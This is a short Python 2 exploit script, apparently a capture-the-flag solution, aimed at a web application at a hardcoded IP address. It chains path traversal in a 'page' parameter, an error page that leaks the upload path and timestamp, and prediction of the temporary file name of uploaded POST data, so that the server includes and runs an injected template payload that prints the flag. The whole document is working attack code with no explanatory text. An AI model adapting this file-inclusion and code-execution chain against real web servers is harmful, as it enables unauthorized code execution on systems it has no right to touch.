#!/usr/bin/python

import requests
import sys

headers = {'Content-type': 'application/x-www-form-urlencoded'}
payload = '<@ echo(get_flag()); @>' 

# get current server information by generating an error.
print "[+] Fetching POST_PATH ... "
s = requests.Session()
r = s.post('http://107.189.94.253/?page=../../includes/error&SCRIPT_EXT=.inc&DEBUG=on',data=payload,headers=headers) 

# parse the post_path
response = r.text.splitlines()
for line in response:
	if "POST_PATH" in line:
		pp = line.split(" ")
		print "[+] Post path is: " + pp[3]
		ts = pp[3].split("/")
		print "[+] Current timestamp: " + ts[2]
		print "[+] Data folder: " + ts[4]

# predict the future
print "[+] Trying to predict the post data file this takes 8 seconds or so"
thetime = long(ts[2],16)
for trying in range(0,8,1):
	trytime  = thetime +3
	strtime = hex(trytime)
	strtime = strtime.upper()
	strtime = strtime.replace("0X", "")
	strtime = strtime.replace("L", "")
	datadir = ts[4].replace(".0","")

	guess = "/uploads/" + strtime + "//" + datadir
	r = s.post('http://107.189.94.253/?page=..' + guess +'&SCRIPT_EXT=.0&DEBUG=on',data=payload,headers=headers)
	response = r.text.splitlines()
	for line in response:
		if "flag{" in line:
			print "[+] Flag: " + line
			quit()

